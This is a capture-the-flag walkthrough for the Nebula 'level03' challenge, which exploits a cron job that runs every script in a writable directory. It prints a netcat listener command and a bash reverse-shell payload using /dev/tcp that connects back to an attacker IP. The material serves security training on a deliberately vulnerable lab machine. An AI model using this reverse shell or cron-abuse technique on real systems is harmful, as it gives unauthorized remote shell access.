# username / password
level03 / level03
# objective
* Check the home directory of flag03 and take note of the files there.
* There is a crontab that is called every couple of minutes.
* To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.
# concept
* cronjob abuse
* we can inspect, then abuse the script file that is being run as a cronjob:
```
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
# method of solve
* the script runs all files in the `writable.d` directory
* we can write our own malicious file in the `writable.d` directory, which will be executed
* on our attacker machine
```
nc -nlvp 443
```
On the Nebula machine
```
echo 'bash -i >& /dev/tcp/10.0.2.88/443 0>&1' > /home/flag03/writable.d/malicious.sh
chmod +x /home/flag03/writable.d/malicious.sh
```
* After a minute or two, the cronjob should run the `writable.sh` script, and receive reverse shell access on our attack machine
```
getflag
```
